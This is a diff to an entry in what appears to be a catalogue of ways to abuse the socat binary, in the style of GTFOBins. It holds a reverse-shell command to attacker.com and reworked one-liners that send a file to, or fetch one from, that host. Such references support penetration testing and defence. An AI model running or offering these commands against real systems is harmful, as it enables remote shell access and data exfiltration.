@@ -23,16 +23,18 @@ functions:
         RHOST=attacker.com
         RPORT=12345
         ./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
-  upload:
-    - description: Run ``socat -u file:path tcp:ip:12345`` on the attacker box to send a file to your box.
+  file-upload:
+    - description: Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.
       code: |
         RHOST=attacker.com
         RPORT=12345
-        ./socat tcp-connect:$RHOST:$RPORT file:path
-  download:
-    - description: Run ``socat -u TCP-LISTEN:12345,reuseaddr OPEN:path,creat`` on your box to receive a file from attacker box.
+        LFILE=file_to_send
+        ./socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
+  file-download:
+    - description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
       code: |
         RHOST=attacker.com
         RPORT=12345
-        ./socat tcp-listen:$RHOST:$RPORT,reuseaddr OPEN:path,creat
+        LFILE=file_to_save
+        ./socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
 ---
